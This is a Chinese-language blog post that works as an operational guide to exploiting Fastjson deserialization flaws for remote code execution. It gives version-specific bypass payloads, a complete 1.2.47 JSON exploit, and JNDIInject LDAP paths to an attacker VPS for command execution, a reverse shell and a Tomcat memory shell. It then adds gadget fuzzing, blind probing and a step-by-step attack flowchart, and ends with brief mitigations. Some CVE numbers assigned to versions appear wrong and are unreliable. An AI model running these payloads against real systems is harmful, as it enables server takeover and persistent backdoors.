---
title: FastJson各版本总结
date: 2026-10-06 00:36:38
categories:
  - WebSecurity
  - CVE
  - 三方组件
  - FastJson
tags:
  - FastJson
  - 反序列化
  - RCE
  - 三方组件
  - 漏洞复现
---

# Fastjson 反序列化漏洞实战知识文档



## 一、核心概念速览

| 概念 | 说明 |
| --- | --- |
| AutoType | fastjson 解析 JSON 中 `@type` 时自动加载指定类，是漏洞根源 |
| JNDI 注入 | 早期 fastjson RCE 的绝大多数方式，通过 `JdbcRowSetImpl` 等触发 `lookup()`，由 RMI/LDAP 服务返回恶意类 / 序列化对象 |
| DNS 外带 | 仅用于**探测**（判断 `@type` 是否触发解析），**不等于 RCE** |
| 不出网 | 目标无法访问外网 VPS，不能走 LDAP/RMI 远程加载，需用本地 gadget / 回显链 |

## 二、各版本漏洞区别（核心版本）

| 版本                | CVE             | 核心漏洞点                               | AutoType 状态                      | 利用方式                                                                                                        | 限制                                          |
| ----------------- | --------------- | ----------------------------------- | -------------------------------- | ----------------------------------------------------------------------------------------------------------- | ------------------------------------------- |
| **≤1.2.24**       | CNVD-2017-02833 | 无黑名单，`@type` 直接加载类                  | 默认开启                             | `JdbcRowSetImpl` 触发 JNDI                                                                                    | JDK8u191+ 后 RMI 受限，优先 LDAP                  |
| 1.2.25~1.2.41     | CVE-2019-14527  | 新增黑名单；`L类名;` 描述符绕过                  | 默认关闭，需 `autoTypeSupport=true`    | `Lcom.sun.rowset.JdbcRowSetImpl;` 绕过黑名单                                                                     | 必须开启 AutoType                               |
| 1.2.42            | CVE-2019-14528  | 修复单重 `L;`，校验首尾字符                    | 默认关闭                             | 双写 `LL...;;` 绕过                                                                                             | 需 AutoType                                  |
| 1.2.43            | CVE-2019-14529  | 修复双写绕过                              | 默认关闭                             | `[` 数组描述符绕过                                                                                                 | 需 AutoType                                  |
| 1.2.44~1.2.45     | CVE-2019-14530  | 修复 `[` 绕过，扩充黑名单                     | 默认关闭                             | 依赖 MyBatis `JndiDataSourceFactory`                                                                          | 目标须有 MyBatis，需 AutoType                     |
| **1.2.47**        | CVE-2019-14531  | **Mappings 缓存绕过，经典高危**              | **关闭也可利用**                       | 先用 `java.lang.Class` 缓存恶意类，二次 `@type` 读缓存绕过黑名单                                                              | **1.2.33~1.2.47 通杀，成功率最高**                  |
| 1.2.48~1.2.67     | 多个，黑名单持续扩充      | 缓存漏洞修复，需依赖第三方 gadget                | 默认关闭，多数链需 AutoType               | XBean / Shiro / C3P0 / Ignite / AnterosDBCP 等                                                               | **强依赖目标 jar 包，成功率不稳定**                      |
| **1.2.68~1.2.83** | CVE-2026-16723  | **Gadget-free 新漏洞**，无需第三方 gadget    | 默认 false，**SafeMode=false 即可触发** | `checkAutoType` 资源探测，SpringBoot FatJar 的 `LaunchedURLClassLoader` 加载 `jar:http://` 远程 jar，类 `<clinit>` 执行代码 | 须 SpringBoot 可执行 jar + JDK8 最佳，SafeMode 可防御 |
| 1.2.84+           | —               | 修复 CVE-2026-16723，**SafeMode 默认开启** | 默认开启 SafeMode                    | 常规 `@type` 全被阻断，基本无法利用                                                                                      | 官方建议迁移 fastjson2                            |

> 
> 关键分界线：**≤1.2.47** 有通用 JNDI 入口；**1.2.48~1.2.67** 需第三方 gadget；**1.2.68~1.2.83** 走特殊 `jar:http` 链；**≥1.2.84** 基本不可利用。

## 三、GitHub 开源利用工具清单

| 工具                      | 地址 / 定位                                                  | 主要用途                                                                       |
| ----------------------- | -------------------------------------------------------- | -------------------------------------------------------------------------- |
| **JNDIExploit**         | `feihua/JNDIExploit`                                     | 一键启动 LDAP (1389)+HTTP (8080)，支持内存马 / 命令执行 / 高 JDK LDAP 绕过，1.2.24/1.2.47 首选 |
| **JNDIMap**             | `X1r0z/JNDIMap`                                          | 轻量 JNDI 服务，LDAP 返回序列化 payload，适配高 JDK，可生成反弹 shell                          |
| **JNDIEXP(JNDIInject)** | `Bl0omZ/JNDIEXP`（原仓库已删，流传 `JNDIInject-1.2-SNAPSHOT.jar`） | 精简版 JNDI 注入工具，含 **gadget fuzz 探测模块**                                       |
| **ysoserial**           | `frohoff/ysoserial`                                      | 生成 CC/CB/Groovy/C3P0 等原生反序列化字节流，**不出网场景核心**                                |
| **JYsoSerial**          | `jangod3/JYsoSerial`                                     | ysoserial 增强版，新增内存马 / 回显链，不出网优先                                            |
| **fastjsonScan**        | `zilong3033/fastjsonScan`（Burp 插件）                       | 被动 / 主动扫描，DNSlog 探测、版本识别、生成 SpringEcho/TomcatEcho **回显 payload**           |
| **FastjsonVulnExp**     | `yijingsec/FastJsonVulnExp`                              | 全套版本 POC，批量探测版本                                                            |
| **jndi_tool**           | `wyzxxz/jndi_tool`                                       | 高 JDK 绕过，可生成内存马                                                            |

## 四、JNDIInject（Bl0omZ/JNDIEXP）使用详解

### 4.1 获取与启动

- 获取：编译产物 `JNDIInject-1.2-SNAPSHOT.jar`；源码可 `mvn clean package -DskipTests`
- 启动（VPS 需放行 1389/1099/8080 及安全组端口）：

```
java -jar JNDIInject-1.2-SNAPSHOT.jar -i <VPS公网IP> -d
```

### 4.2 主要参数

表格

| 参数 | 说明 |
| --- | --- |
| `-i` | 本机对外 IP（必填） |
| `-l` | LDAP 端口，默认 1389 |
| `-r` | RMI 端口，默认 1099 |
| `-p` | HTTP 端口，默认 8080（托管恶意 class） |
| `-d` | debug 模式，打印请求与异常栈（**无 DNS 探测时靠它判断类**） |
| `-u` | 列出全部支持的 LDAP payload 路径 |

路径模板：`ldap://ip:port/Mode/PayloadType/Param`

### 4.3 Payload 分类

表格

| 模式 | 说明 | 适用 JDK |
| --- | --- | --- |
| Basic | 传统 Reference，HTTP 远程加载 class | JDK8u191 前 |
| **Tomcat / BeanFactory** | LDAP 返回序列化对象，**绕过 8u191+ trustURLCodebase** | 8u191+，实战最常用 |

常用路径示例：

```
ldap://vps:1389/Basic/Dnslog/xxx.dnslog.cn        # DNS 探测
ldap://vps:1389/BeanFactory/Command/calc          # 命令执行（Spring 环境）
ldap://vps:1389/Tomcat/Command/calc               # 命令执行（Tomcat 环境）
ldap://vps:1389/BeanFactory/ReverseShell/IP/4433  # 反弹 shell
ldap://vps:1389/Tomcat/Memshell/filter_pass123    # Tomcat Filter 内存马
```

### 4.4 完整实战流程（fastjson 1.2.47 示例）

```
{
    "rand1":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
    "rand2":{"@type":"com.sun.rowset.JdbcRowSetImpl",
             "dataSourceName":"ldap://VPS:1389/BeanFactory/Command/calc",
             "autoCommit":true}
}
```

工具控制台出现目标主机 LDAP 访问即代表 lookup 触发成功。

### 4.5 与 JNDIExploit 对比

表格

| 维度 | JNDIInject | JNDIExploit |
| --- | --- | --- |
| 体量 | 精简，jar 小 | 功能完整 |
| LDAP 序列化绕过 | Tomcat/BeanFactory | 链更多 |
| 内存马 | 仅 Tomcat Filter | Tomcat/Weblogic/Jetty 多中间件 |
| HTTP 回显 payload | **不支持** | 支持 BasicEcho/TomcatEcho |
| 适用 | 快速出网验证 | 红队完整场景 |

## 五、DNS 外带 /fuzz 探测原理与依赖判断

### 5.1 三种 fuzz 路径的含义（JNDIInject 内置）

表格

| 路径 | 作用 |
| --- | --- |
| `/fuzzbyDNS/<dnslog域名>` | **批量遍历全部 gadget**，每条 gadget 触发一次 DNS 请求；命中哪条 → 目标存在对应类 |
| `/fuzz/<PayloadType>/<dnslog域名>` | 限定类别只 fuzz 某一类 gadget（BeanFactory/Tomcat/XBean/Shiro 等） |
| `/URLDNS/<dnslog域名>` | URLDNS gadget 专用探测，命中 = 存在 commons-collections（CC）依赖 |

### 5.2 fuzz 能判断的依赖

表格

| Gadget | 依赖包 | DNS 命中含义 |
| --- | --- | --- |
| BeanFactory | spring-beans（SpringBoot 默认自带） | 8u191+ 首选 RCE 链 |
| Tomcat 链 | tomcat-embed-core | Tomcat 环境 |
| XBean | xbean-reflect | fastjson 1.2.48~1.2.67 常用 |
| Shiro | shiro-core | 存在 Shiro |
| C3P0 | c3p0 | 可走本地 gadget（不出网） |
| URLDNS | commons-collections | 存在 CC 包 |
| Ignite / AnterosDBCP | 对应 jar | 存在对应连接池 / 组件 |

> 
> 误区纠正：
> 
> 
> - **不能拿到完整 jar/pom 列表**，只能检测内置 gadget 对应的少数类
> - DNS 外带命中 ≠ 一定 RCE（还受 JDK 版本、fastjson 版本、AutoType 黑名单、安全管理器影响）
> - 无 DNS 记录 ≠ 无此 jar（可能被黑名单拦截、JDK 不兼容、DNS 出网受限、类版本不匹配）

## 六、DNS 不出网时如何判断类

**核心思路：依靠 LDAP 服务端日志判断，而非 DNSlog。**

### 6.1 方案一：`/fuzz/all` + `-d`（LDAP 能出网，DNS 不行）

```
ldap://VPS:1389/fuzz/all
```

目标访问后 JNDIInject 串行推送各 gadget，通过控制台异常栈区分：

表格

| 日志现象 | 含义 |
| --- | --- |
| `ClassNotFoundException` | ❌ 目标无此 jar / 类 |
| `NoClassDefFoundError` | ⚠️ 类存在但依赖缺失 |
| 其它异常（`IllegalArgumentException`/`InvocationTargetException`）且**无 ClassNotFound** | ✅ **类存在**，可尝试 RCE |
| 无异常正常返回 | ✅ 完整实例化成功，大概率可直接 RCE |

> 
> 一句话：**只要不是 ClassNotFoundException，就代表目标存在该 gadget 类。**
> 局限：串行遍历，某条 gadget 导致致命异常 / 连接中断会终止 fuzz，需分组单独测（BeanFactory、XBean、C3P0 分开）。

### 6.2 方案二：Fastjson 原生 @type 报错探测（LDAP 也不出网）

```
{"@type":"org.springframework.beans.factory.BeanFactory"}
{"@type":"com.mchange.v2.c3p0.ComboPooledDataSource"}
{"@type":"org.apache.commons.collections.functors.InvokerTransformer"}
```

- 返回 `ClassNotFoundException` → 不存在
- 返回 `cannot be cast` / `no default constructor` / `not support autoType` → **类存在**
- 缺点：被 AutoType 黑名单拦截时报错不区分存在性

### 6.3 方案三：HTTP SSRF 类探测

目标能 HTTP 出网但 DNS 被拦时，自建 HTTP 服务，用能触发 SSRF 的 gadget 访问 VPS HTTP 端口，看服务日志判断。

### 6.4 对比表

表格

| 方式 | 需 DNS | 需 LDAP | 适用 |
| --- | --- | --- | --- |
| `/fuzzbyDNS/dnslog` | ✅ | ✅ | DNS 可出网，最简单 |
| `/fuzz/all`（日志模式） | ❌ | ✅ | DNS 被阻断、TCP 可通 |
| Fastjson @type 报错探测 | ❌ | ❌ | 完全不出网盲测 |

## 七、完整排查思路（实战流水线）

### 第 0 步：确认入口点

可控 JSON 参数、能传 `@type`、服务确用 fastjson 解析（报错指纹 / 响应特征确认）。

### 第 1 步：判断版本

1. **报错指纹**：`{"@type":"java.lang.Object"}` 看异常栈里的 `fastjson version 1.2.xx`
2. **特征 payload 盲判**：
   - `Lcom.sun.rowset.JdbcRowSetImpl;` 能触发 → 1.2.25~1.2.41
   - `LL...;;` → 1.2.42；`[com.sun.rowset.JdbcRowSetImpl` → 1.2.43
   - 1.2.47 缓存绕过能触发 → 1.2.33~1.2.47
   - 1.2.68~1.2.83 → 试 CVE-2026-16723 jar:http
   - 1.2.48~1.2.67 → 无通用链，找第三方 gadget
3. 用 DNSlog 探测包辅助确认 `@type` 是否生效

### 第 2 步：判断出站能力

用 `fuzzbyDNS` payload 发包，三种结果：

表格

| 结果 | 处理 |
| --- | --- |
| DNS+LDAP 都能出网 | `fuzzbyDNS` 批量探测 → JNDI RCE |
| LDAP 能出网、DNS 不行 | `/fuzz/all` + `-d` 看日志判断 gadget |
| LDAP 也不出网 | 放弃 JNDI 远程链路，走本地 gadget |

### 第 3 步：完全不出网怎么办

按优先级：

1. **回显 Gadget（首选）**：SpringEcho/TomcatEcho，命令结果直接回 HTTP 响应（fastjsonScan 插件一键生成）；依赖 Tomcat/Spring 环境
2. **本地反序列化 Gadget**：`@type` 盲测类 → 确认存在后用 ysoserial 生成本地 payload（C3P0/CC/Groovy）
3. **内存马注入**：本地 gadget 注入 Tomcat Filter，后续访问路由执行命令
4. **CVE-2026-16723 不出网变种**：`jar:file:/proc/self/fd/N`（仅 Linux + SpringBoot fatjar，条件苛刻）

> 
> ⚠️ 若目标 classpath 干净、无任何可用本地 gadget → **无法 RCE**，只能证明漏洞存在。

### 第 4 步：不出网 + 无回显（盲打场景）

表格

| 手段 | 原理 |
| --- | --- |
| **时间盲注** | 执行 `sleep 5` / `timeout /t 5`，对比响应耗时；需先测基准时间排除网络抖动 |
| **写文件标记** | `echo abc > /web/test.txt`，再 HTTP 访问验证；需写权限 + web 可访问目录 |
| **数据库盲操作** | 插入标记数据，后台确认 |
| **内网反弹** | 目标能连通内网主机时，反弹到内网监听机而非外网 |

> 
> 兜底结论：**延时盲注、写文件是不出网无回显最通用手段**；若无 gadget + 无写权限 + sleep 被安全管理器阻断 → 无法 RCE。

### 完整流程图

```
输入可控JSON → ①判断版本
      ↓
②探测出站（DNS/LDAP TCP）
├─DNS+LDAP出网 → fuzzbyDNS探测gadget → JNDI RCE
├─LDAP出网/DNS不行 → /fuzz/all + -d日志 → JNDI RCE
└─完全不出网
     ├─方案A: SpringEcho/TomcatEcho回显（优先）
     ├─回显不可用 → 方案B: @type盲测 + ysoserial本地gadget
     └─无回显+本地gadget可用 → 盲打: sleep延时 / 写文件 / 内网反弹
```

## 八、踩坑清单（重点）

1. 1.2.48+ 无通用 `JdbcRowSetImpl` 链，**必须找到第三方 gadget**
2. 回显 gadget 强依赖中间件，非 Tomcat/Spring 环境大概率无效
3. 区分 `ClassNotFoundException`（类完全没有）vs `NoClassDefFoundError`（类在但依赖缺失）
4. AutoType 黑名单会拦截 `@type`，类存在也无法触发
5. sleep 延时盲注需先测基准响应时间
6. VPS 防火墙 + 云安全组必须放行 1389/1099/8080
7. JDK≥8u191 用 BeanFactory/Tomcat 链，Basic 模式失效；JDK17 成功率大幅下降
8. JNDIInject 不支持 HTTP 回显，需回显时换 JNDIExploit

## 九、修复方案

1. **首选**：迁移 **fastjson2**（移除旧 AutoType 危险逻辑）
2. fastjson1.x：开启 SafeMode `ParserConfig.getGlobalInstance().setSafeMode(true);`
3. 网络层：限制应用服务器出站访问外网，阻断 LDAP/HTTP 外带
4. 最小依赖：移除 CC、C3P0 等危险 gadget 依赖包